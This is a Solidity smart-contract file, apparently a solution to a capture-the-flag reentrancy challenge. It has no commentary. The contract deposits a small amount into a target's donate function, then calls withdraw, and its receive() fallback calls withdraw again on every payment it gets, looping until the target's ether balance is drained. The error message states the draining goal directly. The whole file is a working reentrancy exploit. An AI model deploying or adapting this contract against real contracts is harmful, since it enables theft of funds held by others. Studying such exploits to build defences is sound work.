// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IReentrancy {
    function donate(address recipient) external payable;

    function withdraw(uint256 amount) external;

    function balanceOf(address account) external returns (uint256);
}

contract Reentrer {
    mapping(address => bool) internal _isReentrable;

    receive() external payable {
        IReentrancy instance = IReentrancy(msg.sender);
        instance.withdraw(msg.value);
    }

    function launchAttack(address instance) external payable {
        uint256 minValue = instance.balance / 100;
        require(msg.value >= minValue, "Too much loop needed to drain value");
        IReentrancy(instance).donate{value: minValue}(address(this));
        payable(msg.sender).call{value: msg.value - minValue}("");
        _isReentrable[msg.sender] = true;
        IReentrancy(instance).withdraw(minValue);
    }
}